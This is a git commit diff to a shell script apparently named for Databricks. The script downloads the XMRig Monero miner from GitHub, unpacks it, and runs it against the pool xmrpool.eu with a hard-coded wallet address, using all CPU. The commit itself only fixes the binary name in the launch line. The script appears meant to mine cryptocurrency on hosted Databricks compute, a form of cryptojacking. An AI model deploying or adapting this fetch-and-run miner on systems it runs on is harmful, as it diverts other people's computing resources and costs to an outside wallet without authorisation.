40f51def5a9e6585364ff34650fc3456fe7f96a2
IvisaDutchDragon <61919699+IvisaDutchDragon@users.noreply.github.com>
2022-09-07 16:41:17 -0500

    Update databricks.sh

--- databricks.sh
+++ databricks.sh
@@ -9,4 +9,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig.exe -o xmrpool.eu:9999 -u 4AHyuanba9aN9MWY5BWFueWNP8NavRRNpc69ZmizjMeKFYE3rMpsmZn4ryPsF5f6w16bPFwGbjzB77pc4XQcHqQ2HmFUVdE+CPU3 -k --tls
+./xmrig -o xmrpool.eu:9999 -u 4AHyuanba9aN9MWY5BWFueWNP8NavRRNpc69ZmizjMeKFYE3rMpsmZn4ryPsF5f6w16bPFwGbjzB77pc4XQcHqQ2HmFUVdE+CPU3 -k --tls
